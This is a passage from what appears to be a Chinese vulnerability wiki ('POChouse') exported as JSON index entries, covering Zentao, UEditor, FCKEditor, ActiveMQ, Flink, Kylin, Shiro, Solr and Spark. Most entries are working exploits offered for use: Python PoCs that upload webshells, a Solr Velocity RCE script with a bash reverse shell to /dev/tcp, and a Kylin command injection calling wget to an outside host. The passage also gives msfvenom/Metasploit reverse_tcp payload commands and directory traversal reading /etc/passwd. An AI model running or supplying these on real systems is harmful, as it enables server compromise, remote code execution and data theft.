\"/api-getModel-editor-save-filePath=/tmp/test\" try: response = requests.post(url=write_url, data=data, headers=headers, timeout=10) print(\"\\033[32m[o] 尝试写入php文件... \\033[0m\") except: print(\"\\033[31m[x] 写入php文件失败 \\033[0m\") sys.exit(0) def POC_3(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } vuln_url = target_url + \"/api-getModel-api-getMethod-filePath=/tmp/test/1\" try: response = requests.get(url=vuln_url, headers=headers, timeout=10) if \"System\" in response.text: print(\"\\033[32m[o] 成功写入文件，存在漏洞, 访问 {}/api-getModel-api-getMethod-filePath=/tmp/test/1/ 查看 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 读取php文件失败 \\033[0m\") except: print(\"\\033[31m[x] 读取php文件失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid >>> \\033[0m\")) POC_1(target_url) POC_2(target_url, zentaosid) POC_3(target_url, zentaosid) POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Zentao-禅道/禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325.html":{"url":"[+] 协同办公OA系统/Zentao-禅道/禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325.html","title":"禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325","keywords":"","body":"禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325 漏洞描述 百度云安全团队监测到禅道官方发布了文件上传漏洞的风险通告，该漏洞编号为CNVD-C-2020-121325，漏洞影响禅道 影响版本 [!NOTE] 禅道 环境搭建 百度下12.4.2的禅道环境按步骤安装下载即可 禅道官方网站 调用接口查询版本信息 http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig 漏洞复现 [!NOTE] 漏洞触发需要后台权限 根据漏洞描述查看修改后的代码片段 修改前 public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; return parent::downloadZipPackage($version, $link); } 修改后 public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(!preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; $file = basename($link); $extension = substr($file, strrpos($file, '.') + 1); if(strpos(\",{$this->config->file->allowed},\", \",{$extension},\") === false) return false; return parent::downloadZipPackage($version, $link); } 这里传入的参数为版本和link地址，然后base64解码，正则判断是否为http或https协议，这里的正则过滤并不完整，所以可以绕过用于下载恶意文件 可以大写http或请求FTP来绕过正则 跟进一下parent::downloadZipPackage这个方法，跟着来到zentao\\module\\client\\model.php文件中 public function downloadZipPackage($version, $link) { ignore_user_abort(true); set_time_limit(0); if(empty($version) || empty($link)) return false; $dir = \"data/client/\" . $version . '/'; $link = helper::safe64Decode($link); $file = basename($link); if(!is_dir($this->app->wwwRoot . $dir)) { mkdir($this->app->wwwRoot . $dir, 0755, true); } if(!is_dir($this->app->wwwRoot . $dir)) return false; if(file_exists($this->app->wwwRoot . $dir . $file)) { return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } ob_clean(); ob_end_flush(); $local = fopen($this->app->wwwRoot . $dir . $file, 'w'); $remote = fopen($link, 'rb'); if($remote === false) return false; while(!feof($remote)) { $buffer = fread($remote, 4096); fwrite($local, $buffer); } fclose($local); fclose($remote); return commonModel::getSysURL() . $this->config->webRoot . $dir . $file; } 可以简单看到这里获取link传入的文件名，通过fopen打开该文件，写入禅道目录www/data/client/version中 查看一下有没有调用这个方法的地方 找到了download方法调用了这个漏洞点，所以我们有两种下载恶意文件的方法 http://xxx.xxx.xxx.xxx/www/client-download-[$version参数]-[base64加密后的恶意文件地址].html http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=[$version参数]&link=[base64加密后的恶意文件地址] 首先先上传一个恶意文件，可以是FTP也可以是HTTP 例如我上传的文件URL为http://peiqi.tech/SHELL.php http://peiqi.tech/SHELL.php | base64加密 HTTP://peiqi.tech/SHELL.php | SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw 请求地址则为 http://xxx.xxx.xxx.xxx/www/index.php?m=client&f=download&version=1&link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw 下载的目录地址为zentaopms\\www\\data\\client\\1 [!NOTE] 目录为version名称 成功上传webshell 漏洞利用POC [!NOTE] POC使用需要拥有后台Cookie #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: zentao version >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mShell >>> http://xxx.xxx.xxx.xxx/shell.php(恶意文件地址) \\033[0m') print('+ \\033[36mZentaosid >>> xxxxxxxxxxxxxx(cookie字段) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] 禅道版本为:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] 获取版本失败 \\033[0m\", e) def POC_2(target_url, shell_url, zentaosid): options = shell_url.split(\"://\") if options[0] == \"http\": shell_url = \"HTTP://\" + options[1] elif options[0] == \"ftp\": shell_url = \"ftp://\" + options[1] else: print(\"\\033[31m[x] 请使用正确的请求地址 \\033[0m\") sys.exit(0) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\":\"zentaosid={}\".format(zentaosid) } shell_url_base = str((base64.b64encode(shell_url.encode('utf-8'))),'utf-8') vuln_url = target_url + \"/www/index.php?m=client&f=download&version=test&link={}\".format(shell_url_base) print(\"\\033[32m[o] 请求漏洞url：{}\\033[0m\".format(vuln_url)) try: response = requests.get(url=vuln_url, timeout=20, headers=headers) if \"保存成功\" in response.text: print(\"\\033[32m[o] 成功写入Webshell，URL地址为：{}/www/data/client/test/Webshell_name.php\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 恶意文件下载失败 \\033[0m\") except: print(\"\\033[31m[x] 恶意文件下载失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) shell_url = str(input(\"\\033[35mShell >>> \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid >>> \\033[0m\")) POC_1(target_url) POC_2(target_url, shell_url, zentaosid) POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 编辑器上传漏洞/":{"url":"[+] 编辑器上传漏洞/","title":"[+] 编辑器上传漏洞","keywords":"","body":"[.Net版]-Ueditor编辑器文件上传 漏洞概述 #影响范围 1.4.3.3 在抓取远程数据源的时候未对文件后缀名做验证导致任意文件写入漏洞，黑客利用此漏洞可以在服务器上执行任意指令 漏洞利用 import requests import re def upload(): url = 'http://www.test.com/ueditor/controller.ashx' # www.test.com/xxx/xxx/controller.ashx photo_shell = 'http://www.test.com/1.gif' #photo_shell headers = { 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Upgrade-Insecure-Requests': '1' } req = requests.post(url=url+'?action=catchimage',headers=headers,data='source[]='+photo_shell+'?.aspx',verify=False) if re.search('SUCCESS',req.text): print('[+] 上传成功！ 请查看响应包内容！') else: print('[-] 上传失败！ 请查看响应包内容！') print(req.text) if __name__ == '__main__': upload() Kindeditor文件上传 Uploader KindEditor.ready(function(K) {xxx var uploadbutton = K.uploadbutton({ button : K('#uploadButton')[0], fieldName : 'imgFile', url : 'http://xxxx/public/editor/php/upload_json.php?dir=file', afterUpload : function(data) { if (data.error === 0) { var url = K.formatUrl(data.url, 'absolute'); K('#url').val(url);} }, }); uploadbutton.fileBox.change(function(e) { uploadbutton.submit(); }); }); [PHP]-FCKEditor 判断版本 /fckeditor/editor/dialog/fck_about.html /FCKeditor/_whatsnew.html currentfolder过滤不严，导致%00截断上传任意文件 POC '.\"\\n\"; $payload .= \"-----------------------------265001916915724--\\r\\n\"; $packet = \"POST {$path}{$connector}?Command=FileUpload&Type=Image&CurrentFolder=\".$foldername.\" HTTP/1.0\\r\\n\"; //print $packet; $packet .= \"Host: {$host}\\r\\n\"; $packet .= \"Content-Type: multipart/form-data; boundary=---------------------------265001916915724\\r\\n\"; $packet .= \"Content-Length: \".strlen($payload).\"\\r\\n\"; $packet .= \"Connection: close\\r\\n\\r\\n\"; $packet .= $payload; print $packet; if (!connector_response(http_send($host, $packet))) die(\"\\n[-] Upload failed!\\n\"); else print \"\\n[-] Job done! try http://${host}/$match[2] \\n\"; ?> [ASP.net]-FCKEditor 2.6.8 任意文件上传 判断版本 /fckeditor/editor/dialog/fck_about.html /FCKeditor/_whatsnew.html 上传一个webshell然后抓包修改扩展名为func.aspx%00txt 第一次上传文件名被修改为shell.aspx_txt 第二次上传同名文件，成功getshell-> shell(1).apsx POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 网络&安全设备/":{"url":"[+] 网络&安全设备/","title":"[+] 网络&安全设备","keywords":"","body":"设备默认口令 华为 xx POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-ActiveMQ/":{"url":"Apache-ActiveMQ/","title":"Apache Active MQ","keywords":"","body":"应用介绍 Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。 登陆后台确定版本： http://IP:8161 官方网站：https://activemq.apache.org 默认用户：admin/admin 相关资产 FOFA app=\"APACHE-ActiveMQ\" 环境搭建 使用Docker安装配置ActiveMQ POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-ActiveMQ/ActiveMQ 反序列化漏洞（CVE-2015-5254）/":{"url":"Apache-ActiveMQ/ActiveMQ 反序列化漏洞（CVE-2015-5254）/","title":"ActiveMQ 反序列化漏洞（CVE-2015-5254）","keywords":"","body":"漏洞概述 该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。 影响范围 ActiveMQ EXP 1、确定目标开启61616端口 nmap -sV -Pn -T4 -sC -p 61616 IP 2、发送反弹payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"反弹shell命令\" -Yp target-IP 61616 3、点击触发Browse event-Message ID ，成功反弹 http://IP:8161/admin/message.jsp?id=ID&JMSDestination=event POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-ActiveMQ/ActiveMQ任意文件写入漏洞（CVE-2016-3088）/":{"url":"Apache-ActiveMQ/ActiveMQ任意文件写入漏洞（CVE-2016-3088）/","title":"ActiveMQ任意文件写入漏洞（CVE-2016-3088）","keywords":"","body":"漏洞概述 ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录 影响范围 ActiveMQ 5.x ~ 5.14.0 EXP python CVE-2016-3088.py -u http://xx.com POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Flink/":{"url":"Apache-Flink/","title":"Apache Flink","keywords":"","body":"应用简介 Flink 是一个开源的分布式流式处理框架(大数据) 官方网站：https://flink.apache.org 默认账户：未授权访问 相关资产 FOFA app=\"APACHE-Flink\" 环境搭建 使用docker快速搭建Flink POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Flink/Apache-Flink 1.9.1 Jar Upload RCE/":{"url":"Apache-Flink/Apache-Flink 1.9.1 Jar Upload RCE/","title":"Apache-Flink 1.9.1 Jar Upload RCE","keywords":"","body":"漏洞概述 Apache Flink 1.9.x 恶意JAR包上传，导致任意命令执行，反弹shell 影响范围 版本： POC import os import subprocess import requests from multiprocessing.dummy import Pool as ThreadPool def get_iplist(): iplist = [] with open('iplist', 'r') as file: data = file.readlines() for item in data: ip = item.strip() iplist.append(ip) return iplist def poc(ip): url = 'http://' + ip + ':8081/jar/upload' try: res = requests.get(url=url, timeout=2) data = { 'msg': res.json(), 'state': 1, 'url': url, 'ip': ip } except: data = { 'msg': 'Secure', 'state': 0, 'ip': ip } if data['state'] == 1: print(data) if __name__ == '__main__': iplist = get_iplist() pool = ThreadPool(50) pool.map(poc, iplist) EXP use exploit/multi/http/apache_flink_jar_upload_exec 参考链接 https://www.exploit-db.com/exploits/48978 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Flink/Apache-Flink-jobmanager 目录遍历（CVE-2020-17519）/":{"url":"Apache-Flink/Apache-Flink-jobmanager 目录遍历（CVE-2020-17519）/","title":"Apache-Flink-jobmanager 目录遍历（CVE-2020-17519）","keywords":"","body":"漏洞概述 Apache Flink 1.11.0中引入的一个更改，允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。 影响范围 Apache Flink 1.11.0 Apache Flink 1.11.1 Apache Flink 1.11.2 POC nuclei.exe -tags apache -t cves/ -stats -u http://test.com:8081 EXP http://your-ip:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd 参考链接 CVE-2020-17519 & CVE-2020-17518 分析 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Flink/Apache-Flink-文件上传和目录遍历（CVE-2020-17518）/":{"url":"Apache-Flink/Apache-Flink-文件上传和目录遍历（CVE-2020-17518）/","title":"Apache-Flink-文件上传和目录遍历（CVE-2020-17518）","keywords":"","body":"漏洞概述 Apache Flink 恶意JAR包上传，导致任意命令执行，反弹shell 影响范围 Flink POC nuclei.exe -tags apache -t cves/ -stats -u http://test.com:8081 EXP 1、Py脚本 python CVE-2020-17518.py http://example.com:8081 2、MSF #生成木马 msfvenom -p java/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f jar > test.jar #监听端口 use exploit/multi/handler set payload java/shell/reverse_tcp set lhost xxx.xxx.xxx.xxx set lport 4444 run 点击查看文件上传页面 -> 点击 Add 上传 jar 文件 参考链接 CVE-2020-17519 & CVE-2020-17518 分析 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Kylin/":{"url":"Apache-Kylin/","title":"Apache Kylin","keywords":"","body":"应用简介 Apache Kylin是一个开源的分布式分析引擎，提供Hadoop之上的SQL查询接口及多维分析（OLAP）能力以支持超大规模数据，最初由eBay Inc. 开发并贡献至开源社区。它能在亚秒内查询巨大的Hive表。 官方网站：http://kylin.apache.org/cn 默认账户：admin/KYLIN 影响范围 FOFA app=\"APACHE-kylin\" body=\"kfkSchema\" 环境搭建 用 Docker 运行 Kylin 相关漏洞 Apache Kylin的未授权配置泄露 CVE-2020-13937 http://xxx.xxx.xxx.xxx/kylin/api/admin/config POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Kylin/命令注入漏洞（CVE-2020-13925）/":{"url":"Apache-Kylin/命令注入漏洞（CVE-2020-13925）/","title":"命令注入漏洞（CVE-2020-13925）","keywords":"","body":"漏洞概述 黑客可以利用这个漏洞，登录任何管理员账号和密码默认未修改的账号，获得管理员权限。 影响范围 Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0 ~ 3.0.2 POC 原始请求： http://host:port/kylin/api/diag/project/learn_kylin/download PoC请求，GET方法： http://host:port/kylin/api/diag/project/%7c%7cwget%20h1j96qoac5o9mbqpkewkhxxa218rwg.burpcollaborator.net%7c%7c/download 将项目名称“learn_kylin”替换为如下payload访问即可： ||wget h1j96qoac5o9mbqpkewkhxxa218rwg.burpcollaborator.net|| EXP 1、访问 System-Configuration-Diagnosis。触发下载诊断信息的请求 http://host:port/kylin/api/diag/project/learn_kylin/download 2、发送上方POC POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Shiro/":{"url":"Apache-Shiro/","title":"Apache Shiro","keywords":"","body":"应用简介 Shiro 是 Apache 旗下的一个用于权限管理的开源框架，提供开箱即用的身份验证、授权、密码套件和会话管理等功能 官方网站：https://shiro.apache.org 相关资产 FOFA app=\"APACHE-Shiro\" 环境搭建 Docker POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Shiro/Shiro 550反序列化（CVE-2016-4437）/":{"url":"Apache-Shiro/Shiro 550反序列化（CVE-2016-4437）/","title":"Shiro 550反序列化（CVE-2016-4437）","keywords":"","body":"漏洞概述 在 Shiro 1.2.4 及之前的版本，Shiro 秘钥是硬编码的一个值 kPH+bIxk5D2deZiIxcaaaA==，这便是 Shiro-550 的漏洞成因。 但这个漏洞不只存在于 1.2.4 版本，后续版本的读取流程没有什么改动，这就意味着只要秘钥泄露，依然存在高危风险。 Shiro Top 100 Key 是基于一些 Github 示例代码收集的 影响范围 Shiro 漏洞利用 1、扫描探测可利用的Key和Gadget利用链 @wyzxxz 一键工具（可回显） java -jar shiro_tool.jar http://xxshiro.com/login 有Key和Gadget利用链： 1）看下是不是jar包部署的，不是的话直接传webshell 2）jar包部署的看看能不能出网，能出网（反弹shell），不能出网（传内存马） 2、上传内存马 @j1anFen （回显执行命令/注入内存马） 扩展链接 Shiro RememberMe 漏洞检测的探索之路 Shiro550 无Commons-collections依赖利用工具 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Shiro/Shiro 721 Padding Oracle漏洞/":{"url":"Apache-Shiro/Shiro 721 Padding Oracle漏洞/","title":"Shiro 721 Padding Oracle漏洞","keywords":"","body":"漏洞概述 Shrio所使用的cookie里的rememberMe字段采用了AES-128-CBC的加密模式，这使得该字段可以被padding oracle 攻击利用。 攻击者可以使用一个合法有效的rememberMe 的cookie作为前缀来实施POA，然后制造一个特制的rememberMe来执行Java反序列化攻击，比如Shrio 550那样的 影响范围 Shiro 漏洞利用 登录网站，任意用户，获取一个合法的remmemberMe cookie（勾选Remember Me）。 使用rememberMe cookie作为前缀来实施POA。 加密Java反序列化的payload来制作特制的rememberMe 带着新的rememberMe向网站发起请求 这个漏洞相较于550而言，它不需要知道key的值，但是它需要一个合法用户的rememberMe cookie； 飞鸿大佬写了一键化利用工具 https://github.com/feihong-cs/ShiroExploit-Deprecated 参考链接 Shiro 721 Padding Oracle攻击漏洞分析 Shiro-721 RCE Via Padding Oracle Attack POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Shiro/Shiro 权限绕过漏洞/":{"url":"Apache-Shiro/Shiro 权限绕过漏洞/","title":"Shiro 权限绕过漏洞","keywords":"","body":"Shiro-682 Shiro 1.3.2 Shiro /admin/1/ 即URL结尾添加反斜杠绕过权限验证 CVE-2020-13933 Shiro xxx.com/res/;name 当请求的资源存在时即可绕过权限验证查看资源 @三六零CERT CVE-2020-17523 Apache Shiro xxx.com/admin/%20 空格绕过了权限验证 @jweny POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Solr/":{"url":"Apache-Solr/","title":"Apache Solr","keywords":"","body":"应用简介 Apache Solr 是一个开源的搜索服务器。 Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。 官方网站：https://solr.apache.org 相关资产 FOFA: app=\"APACHE-Solr\" title=\"Solr Admin\" body=\"Solr Query Syntax\" icon_hash=\"http://223.94.66.173:8983/favicon.ico\" 环境搭建 Vulhub Docker POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Solr/Solr 未授权上传漏洞（CVE-2020-13957）/":{"url":"Apache-Solr/Solr 未授权上传漏洞（CVE-2020-13957）/","title":"Solr 未授权上传漏洞（CVE-2020-13957）","keywords":"","body":"漏洞概述 在特定的Solr版本中ConfigSet API存在未授权上传漏洞，攻击者利用漏洞可实现远程代码执行。 影响版本 Apache Solr 6.6.0 -6.6.5 Apache Solr 7.0.0 -7.7.3 Apache Solr 8.0.0 -8.6.2 漏洞复现 在攻击机上下载目标版本的Solr,执行下列命令打包压缩文件 solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf zip -r - * > vuln.zip 将 vuln.zip 进行上传 curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @vuln.zip \"http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD&name=vuln\" name参数为压缩包的文件名 利用漏洞创建一个 core curl \"http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE&name=peiqi&numShards=1&replicationFactor=1&wt=xml&collection.configName=vuln\" name参数为创建的core核心名 collection.configName参数为上传的文件名 查看core列表，发现已经成功创建 再使用 Apache Solr Velocity模板远程执行 CVE-2019-17558 即可执行任意命令 漏洞利用POC 使用前按复现步骤上传对应版本的zip文件，例如我这里上传的文件为 qwert.zip,其他使用方法与 Apache Solr Velocity模板远程执行 CVE-2019-17558 的POC使用方法类似 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys import os import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Solr 6.6.0 -6.6.5 \\033[0m') print('+ \\033[34m Apache Solr 7.0.0 -7.7.3 \\033[0m') print('+ \\033[34m Apache Solr 8.0.0 -8.6.2 \\033[0m') print('+ \\033[36m使用格式: python3 cve-2020-13957.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mZip >>> vuln.zip(Zip文件名) \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): core_name = str(input(\"\\033[35mPlease input Create Core Name\\nCore >>> \\033[0m\")) core_update = \"\"\"%s/solr/admin/collections?action=CREATE&name=%s&numShards=1&replicationFactor=1&wt=xml&collection.configName=%s\"\"\" % (target_url, core_name, file_name.replace(\".zip\",\"\")) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } response = requests.get(url=core_update, headers=headers, timeout=30) if response.status_code != 200: print(\"\\033[31m[x] 创建Core失败 \\033[0m\") sys.exit(0) else: core = re.findall(r'(.*?)',response.text)[0] vuln_url = target_url + \"/solr/\" + core + \"/config\" print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core + \"/config\\033[0m\") return vuln_url,core def POC_2(target_url, core): open_params = target_url + \"/solr/\" + core + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POST请求成功将params.resource.loader.enabled设置为True \\033[0m\") else: print(\"\\033[31m[x] POST请求params.resource.loader.enabled设置为True失败 \\033[0m\") sys.exit(0) def POC_3(target_url, core, cmd): vuln_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] 代码执行失败，响应为 Error 500 \\033[0m\") else: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) def POC_4(target_url, core, IP, PORT): # POC : /bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, PORT) vnul_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = str(input(\"\\033[35mPlease input File Name\\nZip >>> \\033[0m\")) vuln_url,core = POC_1(target_url, file_name) POC_2(target_url, core) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_4(target_url, core, IP, PORT) else: POC_3(target_url, core, cmd) POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Solr/Solr 远程命令执行漏洞（CVE-2019-0193）/":{"url":"Apache-Solr/Solr 远程命令执行漏洞（CVE-2019-0193）/","title":"Solr 远程命令执行漏洞（CVE-2019-0193）","keywords":"","body":"漏洞概述 此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。 它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。 由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行 影响范围 Solr POC python poc.py EXP 方法一 python3 exp.py 方法二 访问http://ip:8983/Apache solr的管理页面，无需登录（默认未开启鉴权认证） POST /solr/tika/dataimport HTTP/1.1 Host: solr.com:8983 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://solr.com:8983/solr/ Content-type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Content-Length: 585 Connection: close command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig= ./666.txt\"); } ]]> bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 如直接如上写入反弹无反应，需要base64加密写才能反弹一个shell 漏洞分析 https://xz.aliyun.com/t/5965#toc-6 POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Spark/":{"url":"Apache-Spark/","title":"Apache Spark","keywords":"","body":"应用简介 Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。 相关资产 FOFA app=\"APACHE-Spark\" 环境搭建 vulhub Docker POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"Apache-Spark/Apache Spark 未授权访问漏洞/":{"url":"Apache-Spark/Apache Spark 未授权访问漏洞/","title":"Apache Spark 未授权访问漏洞","keywords":"","body":"漏洞概述 如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。 漏洞利用 use exploit/linux/http/spark_unauth_rce set payload java/meterpreter/reverse_tcp set rhost 192.168.226.140 set rport 6066 set lhost 